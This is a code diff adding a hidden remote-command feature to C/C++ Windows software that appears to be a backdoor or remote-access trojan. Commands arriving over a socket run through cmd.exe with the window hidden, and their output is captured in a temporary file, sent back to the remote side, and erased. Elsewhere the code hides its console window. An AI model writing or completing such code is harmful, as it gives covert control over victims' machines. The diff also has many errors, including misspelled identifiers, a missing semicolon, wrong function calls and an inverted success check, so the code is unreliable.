@@ -18,6 +18,40 @@ void exec(char* ansVal, int ansLong, char *file){
 		strcat(ansVal,"\n");	
 }
 
+void cmd(char* ansVal, int ansLong, char *command){
+	char finalCommand[100] = "/c ";
+	char lineByLine[100];
+	char fileContent[1000]="";
+	FILE *fileName;
+	
+	strcat(finalCommand,command);
+	strcat(finalCommand," > a.txt");
+	
+	if(32 >= (int)(shellExecute(NULL,"open","cmd.exe",finalCommand,NULL,SW_HIDE))){
+		Sleep(100);
+		fileName = fOpen("a.txt");
+		
+		if(fileName != NULL){
+		
+			while(!feof(fileName)){
+				fgets(libeByLine,100,fileName);
+				strcat(fileContent,lineByLine);
+			}
+			fclose(fileName);
+		}
+		
+		else{
+			strcmp(fileContent,"No se pudo obtener el archivo");
+		}
+		ShellExecute(NULL,"open","cmd.exe","/c del a.txt",NULL,SW_HIDE);
+		strcat(ansVal,fileContent);
+	}
+	
+	else
+		strcat(ansVal,"\n");
+
+}
+
 void HideCmdWindowsWithoutFlash(){
 	HWND hide = FindWindowA("ConsoleWindowClass",NULL); //check
 	AllocConsole(); //check
@@ -83,7 +117,7 @@ void ConnectSocket(SOCKET &socketS,sockaddr_in &server){
 				}
 				*/
 				for(int i = 0; i < 1024; i++){
-					if(Received[i] == " ")
+					if(Received[i] == *" ")
 						break;
 					else
 						valSend[i] = Received[i];
@@ -91,9 +125,15 @@ void ConnectSocket(SOCKET &socketS,sockaddr_in &server){
 				if(strcmp(valSend,"exec") ==0){
 					char execute[1024] = "";
 					int j = 0;
-					for(int i=5;i<(*(&Received + 1) - Received); ++i){
+					/*for(int i=5;i<(*(&Received + 1) - Received); ++i){
 						execute[j] = Received[i];
 						++j;
+					}*/
+					for(int i = 5; i < 1024; i++){
+						if(Received[i] == 0)
+							break;
+						execute[j] = Received[i];
+						j++;
 					}
 					char buff[250] = "";
 					exec(buff,250, execute);
@@ -102,6 +142,24 @@ void ConnectSocket(SOCKET &socketS,sockaddr_in &server){
 					memset(buff,0,sizeof(buff));
 					memset(Received, 0, sizeof(Received));
 				}
+
+				else if(strcmp(valSend,"cmd")==0){
+					char execute[1024] = "";
+					int j = 0;
+					for(int i = 4; i < 1014; i++){
+						if(Received[i] == 0)
+							break;
+						execute[j] = Received[i];
+						j++
+					}
+					char buff[1020] = "";
+					cmp(buff,1020,execute);
+					strcat(buff,"\n");
+					send(socketS, buff, strlen(buff) + 1, 0);
+					memset(buff,0,sizeof(buff));
+					memset(Received, 0, sizeof(Received));
+				}
+
 				else{
 					char buff[30] = "[-]Comando no reconocido\n";
 					send(socketS, buff, strlen(buff)+1,0);
